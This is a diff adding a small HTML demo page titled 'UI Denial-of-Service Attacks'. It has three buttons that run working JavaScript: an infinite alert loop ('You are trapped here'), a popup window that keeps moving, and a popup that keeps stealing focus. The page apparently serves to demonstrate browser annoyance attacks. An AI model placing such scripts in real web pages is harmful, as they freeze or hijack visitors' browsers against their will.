@@ -1,0 +1,47 @@
+<!docktype html>
+<html lang='en'>
+<head>
+<meta charset='utf-8'>
+<script>
+function alertLoop()
+{
+	const messages = ['Hi there!','Welcome to my awesome website','You are trapped here']
+	while(true)
+	{
+		messages.forEach(window.alert)
+	}
+}
+
+function newWin()
+{
+	var winArr = []
+	const win = window.open('','','width=100,height=100')
+	let i=0
+	setInterval(() =>{
+		win.moveTo(i,i)
+		win.resizeTo(100,100)
+		i = (i+5) % 200
+	},100)
+	winArr.push(win)
+}
+
+function focusWin()
+{
+	var winArr = []
+	const win = window.open('','','width=100,height=100')
+	setInterval(() => {
+		win.focus()
+	},200)
+	winArr.push(win)
+}
+</script>
+</head>
+<body>
+<h3> UI Denial-of-Service Attacks </h3>
+<input type="button" value="Infinite Alert Loop" onclick="alertLoop()" />
+
+<input type="button" value="New Window" onclick="newWin()" />
+
+<input type="button" value="Focus Window" onclick="focusWin()" />
+</body>
+</html>
